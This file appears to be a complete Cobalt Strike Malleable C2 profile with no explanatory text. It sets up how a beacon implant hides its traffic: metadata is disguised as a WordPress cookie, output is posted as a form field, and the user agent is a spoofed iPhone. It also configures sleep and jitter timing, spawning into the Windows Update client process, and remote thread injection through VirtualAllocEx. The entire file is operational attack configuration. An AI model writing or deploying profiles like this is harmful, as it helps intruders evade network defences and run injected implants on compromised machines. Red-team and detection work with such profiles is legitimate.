set sleeptime "62044";
set jitter "41";
set spawnto_x86 "%windir%\syswow64\WUAUCLT.exe";
set spawnto_x64 "%windir%\sysnative\WUAUCLT.exe";
set useragent "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0";

http-get {
    set uri "/favicon.css";
    set verb "GET";

    server {

        output {
            prepend "";
            base64;
            netbios;
            print;
        }
    }

    client {
        header "Connection" "close";
        header "Accept-Language" "en-US";

        metadata {
            mask;
            base64;
            prepend "wordpress_ed1f617bbd6c004cc09e046f3c1b7148=";
            header "Cookie";
        }
    }
}

http-post {
    set verb "POST";
    set uri "/remove";

    client {
        header "Connection" "close";
        header "Accept-Encoding" "br";
        header "Content-Type" "application/x-www-form-urlencoded";

        output {
            netbiosu;
            base64;
            prepend "apply=";
            print;
        }

        id {
            base64;
            prepend "__session__id=";
            header "Cookie";
        }
    }
}

stage {
    set cleanup "1";
    set sleep_mask "154890";
}

process-inject {
    set startrwx "false";
    set userwx "false";
    set min_alloc "28399";

    transform-x86 {
        append "\x90\x90\x90\x90\x90\x90\x90";
    }

    transform-x64 {
        append "\x90\x90\x90\x90\x90\x90\x90";
    }

    execute {
        CreateThread;
        RtlCreateUserThread;
        CreateRemoteThread;
    }
    set allocator "VirtualAllocEx";
}
